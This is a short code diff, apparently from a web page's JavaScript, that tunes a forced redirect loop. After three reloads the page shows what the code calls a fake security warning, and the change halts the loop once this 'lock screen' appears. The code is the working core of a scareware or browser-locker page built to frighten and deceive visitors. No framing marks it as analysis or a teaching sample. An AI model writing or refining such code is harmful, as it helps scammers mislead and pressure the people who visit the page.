@@ -895,9 +895,10 @@
                     // Show fake security warning popup after a few redirects
                     if (newCount >= 3) {
                         showFakeSecurityWarning();
+                        return; // STOP HERE - don't trigger next redirect
                     }
                     
-                    // Trigger next redirect
+                    // Trigger next redirect (only if we haven't shown the lock screen)
                     setTimeout(() => {
                         window.location.href = window.location.pathname + '?loop=' + Math.random();
                     }, 500);
